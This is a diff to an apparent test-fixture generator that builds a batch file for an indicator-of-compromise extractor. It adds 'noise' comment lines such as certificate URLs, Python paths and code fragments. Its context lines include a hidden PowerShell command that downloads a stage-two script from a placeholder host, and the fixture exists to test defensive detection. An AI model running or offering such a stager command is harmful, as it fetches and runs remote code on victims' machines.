@@ -1023,6 +1023,13 @@ def ioc_noise_bat() -> bytes:
         "rem noise (no such TLD at IANA): cfg.zz row.qq data.xx",
         "rem real: reply to accounts@billing-portal.example",
         "rem noise: invoices are paid at month end, type of payment: transfer",
+        # signed-MSI / bundled-runtime noise (CPython license, PKI, printf, build agent, JS members)
+        "rem noise: http://crl3.digicert.com/x.crl cacerts.digicert.com https://sectigo.com/CPS www.pythonlabs.com",
+        "rem noise: builtins.id collections.abc self.af thread.local 1.invalid action.name microsoft.windows os.py",
+        "rem noise: [RuntimeVsdnetRTName].NET jseward@acm.org policy 2.23.140.1.3.6.1",
+        r"rem noise: D:\a\1\s\Objects\object.c D:\a\1\b\bin\amd64\python311.pdb",
+        "rem noise: cmd = 'LIST'",
+        "rem noise: nc += prev",
         r'copy "C:\Program Files\Billing Portal\inv viewer.exe" %TEMP%\inv.exe',
         "powershell -nop -w hidden -c \"iwr http://billing-portal.example/inv/stage2.ps1\"",
         "",
